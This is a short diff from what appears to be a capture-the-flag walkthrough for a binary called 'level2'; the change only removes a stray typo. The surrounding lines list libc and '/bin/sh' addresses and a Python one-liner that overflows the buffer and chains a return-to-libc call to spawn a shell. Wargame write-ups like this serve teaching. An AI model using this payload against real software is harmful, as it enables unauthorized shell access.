@@ -143,7 +143,7 @@ main ``return`` address: ``0x0804854b``, who gives ``\x4b\x85\x04\x08``.
 </br>
 ``exit`` function address: ``0xb7e5ebe0``, who gives ``\xe0\xeb\xe5\xb7``.
 </br>
-``/bin/sh``: ``0xb7f8cc58``, who gives ``\x58\xcc\xf8\xb7``.s
+``/bin/sh``: ``0xb7f8cc58``, who gives ``\x58\xcc\xf8\xb7``.
 
 ```
 $ (python -c 'print("0"*80+"\x4b\x85\x04\x08"+"\x60\xb0\xe6\xb7"+"\xe0\xeb\xe5\xb7"+"\x58\xcc\xf8\xb7")'; cat) | ./level2
